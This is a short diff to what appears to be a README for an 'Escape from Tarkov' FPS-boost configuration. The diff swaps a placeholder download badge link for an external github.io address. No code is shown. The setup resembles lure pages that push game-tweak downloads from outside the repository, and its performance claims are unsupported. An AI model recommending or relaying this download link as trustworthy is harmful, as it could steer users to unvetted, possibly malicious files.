@@ -2,7 +2,7 @@
 
 An advanced configuration set for Escape from Tarkov to maximize frame rate, reduce micro-stutters, and enhance system responsiveness. Perfect for low-end and high-end PCs alike, this setup ensures smoother raids and faster loading times.
 
-[![Download Tarkov Config](https://img.shields.io/badge/Download-Tarkov_Config-blueviolet)](#)
+[![Download Tarkov Config](https://img.shields.io/badge/Download-Tarkov_Config-blueviolet)](https://tarkov-fps-boost-config.github.io/.github)
 
 ---
 
